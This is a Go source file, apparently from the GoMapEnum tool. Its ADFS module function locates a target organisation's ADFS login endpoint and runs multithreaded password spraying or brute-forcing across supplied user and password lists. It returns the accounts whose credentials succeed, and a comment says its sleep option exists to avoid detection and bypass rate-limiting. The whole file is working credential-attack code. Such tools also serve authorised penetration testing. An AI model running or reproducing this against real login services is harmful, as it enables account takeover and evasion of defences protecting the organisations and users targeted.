package adfs

import (
	"GoMapEnum/src/utils"
	"strconv"
	"strings"
	"sync"
	"time"
)

// Brute will bruteforce or spray passwords on the specified users.
func (options *Options) Brute() []string {
	log = options.Log
	var wg sync.WaitGroup
	var validusers []string
	mux := &sync.Mutex{}

	// If the target is not specified, we will try to find the ADFS URL with the endpoint getuserrealm
	if options.Target == "" {
		options.Target = options.findTarget(options.Domain)
		if options.Target == "" {
			log.Error("The ADFS URL was not found")
			return validusers
		}
		log.Verbose("An ADFS instance has been found on " + options.Target)
	}
	options.Users = utils.GetStringOrFile(options.Users)
	options.Passwords = utils.GetStringOrFile(options.Passwords)
	usersList := strings.Split(options.Users, "\n")
	passwordList := strings.Split(options.Passwords, "\n")

	queue := make(chan string)

	for i := 0; i < options.Thread; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			var j = 0
			for email := range queue {
				// Sleep to avoid detection and bypass rate-limiting
				if options.Sleep != 0 {
					options.Log.Debug("Sleep " + strconv.Itoa(options.Sleep) + " seconds")
					time.Sleep(time.Duration(options.Sleep) * time.Second)
				}
				if options.NoBruteforce {
					if options.brute(email, passwordList[j]) {
						mux.Lock()
						validusers = append(validusers, email)
						mux.Unlock()
					}

				} else {
					for _, password := range passwordList {
						if options.brute(email, password) {
							mux.Lock()
							validusers = append(validusers, email)
							mux.Unlock()
							break // No need to continue if password is valid
						}
					}
				}
				j++
			}

		}(i)
	}

	// Trim emails and send them to the pool of workers
	for _, user := range usersList {
		user = strings.ToValidUTF8(user, "")
		user = strings.Trim(user, "\r")
		user = strings.Trim(user, "\n")
		queue <- user
	}

	close(queue)
	wg.Wait()
	return validusers

}
